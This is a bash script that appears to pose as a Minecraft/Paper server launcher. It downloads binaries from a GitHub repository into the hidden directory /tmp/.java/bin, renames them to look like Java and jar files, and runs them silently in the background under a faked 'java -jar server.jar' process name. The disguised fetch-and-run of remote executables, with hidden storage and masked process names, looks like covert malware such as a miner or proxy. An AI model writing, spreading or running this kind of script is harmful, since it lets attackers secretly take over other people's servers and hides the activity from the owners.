#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/zpr-glibc2.39-amd64 -o java
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o paper.jar
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/patch.jar -o patch.jar
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/ukbyt/chsl.conf -o cfg.conf
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && nohup ./java -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/paper.jar" ] && [ -f "/tmp/.java/bin/patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi